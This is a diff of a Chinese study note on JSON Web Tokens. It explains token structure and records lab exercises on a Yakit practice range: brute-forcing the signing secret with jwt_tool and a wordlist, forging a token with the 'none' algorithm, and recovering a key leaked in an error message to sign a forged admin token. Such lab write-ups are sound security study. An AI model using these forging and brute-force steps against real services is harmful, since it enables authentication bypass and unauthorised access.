@@ -2,24 +2,26 @@
 title: JWT
 lang: zh
 date: 2025-04-11
+type: note
 ---
+
 1. 身份验证：修改某个用户密码，管理员。cookie
 2. 会话管理：客户端连续不断的和服务器进行请求和响应
 3. 控制访问：登陆模块 登陆给定身份 身份去访问后台地址 /admin等
 
-
 参考 https://forum.butian.net/share/2734
 
 参考 https://www.cnblogs.com/xiaozi/p/12005929.html
+
 ## 组成
 
-JWT =Json Web Token   
+JWT =Json Web Token
 head payload signature
 
 JWT = Base64(Header) + "." + Base64(Payload) + "." + Base64(Signature)
 
 JWTString =
-Base64(Header) + "." + Base64(Payload) + "." 
+Base64(Header) + "." + Base64(Payload) + "."
 +Base64(HMAC_SHA256(Header + "." + Payload, Secret))
 
 JWT本质上是一个字符串，分为三个部分:
@@ -27,7 +29,6 @@ JWT本质上是一个字符串，分为三个部分:
 1. **Header**: 存放Token类型和加密的方法
 2. **Payload**: 包含一些用户身份信息.
 3. **Signature**: 签名是将前面的Header,Payload信息以及一个密钥组合起来并使用Header中的算法进行加密
-
 
 ### Header
 
@@ -40,7 +41,7 @@ JWT本质上是一个字符串，分为三个部分:
 
 ```json
 {
-  "alg": "HS256", 
+  "alg": "HS256",
   "typ": "JWT"
 }
 ```
@@ -62,6 +63,7 @@ Payload包含了JWT的主要信息，通常使用JSON对象表示并使用Base64
   "iat": 1516239022
 }
 ```
+
 其中sub表示主题，name表示名称，iat表示JWT的签发时间
 
 ### Signature 部分
@@ -103,23 +105,21 @@ JWT的工作流程如下：
 
 ![](https://pic.desolatehao.top/ba2a3d82b67f4900d98e959db19b86e4.png)
 
-
 ## 爆破密钥
 
-JWT 字典 https://github.com/wallarm/jwt-secrets   
-JWT tool https://github.com/ticarpi/jwt_tool   
-使用参考 [https://www.cnblogs.com/xiaozi/p/12005929.html](https://www.cnblogs.com/xiaozi/p/12005929.html)   
+JWT 字典 https://github.com/wallarm/jwt-secrets
+JWT tool https://github.com/ticarpi/jwt_tool
+使用参考 [https://www.cnblogs.com/xiaozi/p/12005929.html](https://www.cnblogs.com/xiaozi/p/12005929.html)
 
 ```
 git clone https://github.com/ticarpi/jwt_tool
 
-python3 jwt_tool.py eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiIsImZsYWciOnRydWV9.eyJ1c2VybmFtZSI6ImFkbWluIn0.hPJrgFH1DKiTTI5Zujw2PiaaQ-7Q3LAQWKyhaYRd000 -C -d jwt.secrets.txt 
+python3 jwt_tool.py eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiIsImZsYWciOnRydWV9.eyJ1c2VybmFtZSI6ImFkbWluIn0.hPJrgFH1DKiTTI5Zujw2PiaaQ-7Q3LAQWKyhaYRd000 -C -d jwt.secrets.txt
 
 ```
+
 这里没爆破出来
 ![](https://pic.desolatehao.top/432cc139bf731b71625d53bdbdc5ef19.png)
-
-
 
 ## yakit靶场记录
 
@@ -137,29 +137,33 @@ http://192.168.3.5:8787/jwt/unsafe-login1
 ![](https://pic.desolatehao.top/d239e85732385eae1429cc7527e5178e.png)
 
 涉及两个url
+
 ```
-http://192.168.3.5:8787/jwt/unsafe-login1 
+http://192.168.3.5:8787/jwt/unsafe-login1
 http://192.168.3.5:8787/jwt/unsafe-login1/profile
 ```
-在unsafe-login1 的返回包中给定了JWT 
+
+在unsafe-login1 的返回包中给定了JWT
+
 ```
 eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.BDZ-6VZXox9VgFtNLACCgx-_MmHF7Qx3w-V9okF5RXk
 ```
 
 目标是在header中添加flag字段
+
 ```
 eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9
 解码如下
 {"age":25,"alg":"HS256","kid":1,"typ":"JWT","username":"admin"}
 
 添加flag属性，修改alg加密算法为none
-{  
-    "age": 24,  
-    "alg": "none",  
-    "kid": 1,  
-    "typ": "JWT",  
-    "username": "admin",  
-    "flag": True  
+{
+    "age": 24,
+    "alg": "none",
+    "kid": 1,
+    "typ": "JWT",
+    "username": "admin",
+    "flag": True
 } 加密后为
 eyJhZ2UiOiAyNCwgImFsZyI6ICJub25lIiwgImtpZCI6IDEsICJ0eXAiOiAiSldUIiwgInVzZXJuYW1lIjogImFkbWluIiwgImZsYWciOiB0cnVlfQ==
 
@@ -168,6 +172,7 @@ eyJhZ2UiOiAyNCwgImFsZyI6ICJub25lIiwgImtpZCI6IDEsICJ0eXAiOiAiSldUIiwgInVzZXJuYW1l
 eyJhZ2UiOiAyNCwgImFsZyI6ICJub25lIiwgImtpZCI6IDEsICJ0eXAiOiAiSldUIiwgInVzZXJuYW1lIjogImFkbWluIiwgImZsYWciOiB0cnVlfQ==.eyJ1c2VybmFtZSI6ImFkbWluIn0.
 第三段留空
 ```
+
 ![](https://pic.desolatehao.top/fe7085135ea688a83b2fd982c62eceff.png)
 ![](https://pic.desolatehao.top/62ebe8c5f167c9a3b950ca99ffb9c99a.png)
 
@@ -181,18 +186,20 @@ eyJhZ2UiOiAyNCwgImFsZyI6ICJub25lIiwgImtpZCI6IDEsICJ0eXAiOiAiSldUIiwgInVzZXJuYW1l
 
 测试修改部分JWT 发现报错回显 其中泄露密钥
 ![](https://pic.desolatehao.top/45195d9ee87e1d43fc7f53a2c6bbf5b1.png)
+
 ```
 原JWT为
 eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.BDZ-6VZXox9VgFtNLACCgx-_MmHF7Qx3w-V9okF5RXk
 
 报错为如下
-parse jwt faild, 
-jwt: Bearer eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.BDZ-6VZXox9VgFtNLACCgx-_MmHF7Qx3w-V9okF, 
+parse jwt faild,
+jwt: Bearer eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.BDZ-6VZXox9VgFtNLACCgx-_MmHF7Qx3w-V9okF,
 key: [84 81 90 74 68 68 97 99 74 103 76 117 121 80 112 73 65 106 111 88],
 error: signature is invalid
 ```
 
 其中header字段中解码为如下，加密算法为HS256，解码key
+
 ```
 {"age":25,"alg":"HS256","kid":1,"typ":"JWT","username":"admin"}
 
@@ -201,8 +208,10 @@ error: signature is invalid
 hex格式 转码为
 TQZJDDacJgLuyPpIAjoX 验证一下 正确了
 ```
+
 构造JWT
 ![](https://pic.desolatehao.top/dc8266fcde873f85c8dc7deea4390c68.png)
+
 ```
 eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1pbiIsImZsYWciOnRydWV9.eyJ1c2VybmFtZSI6ImFkbWluIn0.hPJrgFH1DKiTTI5Zujw2PiaaQ-7Q3LAQWKyhaYRd000
 ```
@@ -210,4 +219,3 @@ eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MSwidHlwIjoiSldUIiwidXNlcm5hbWUiOiJhZG1p
 重新登陆拦截测试
 ![](https://pic.desolatehao.top/c98465eaa358f0aed6c2e98a19f0a4c9.png)
 ![](https://pic.desolatehao.top/bdc3a6c9b50277638420f8ecbb9bd1fa.png)
-
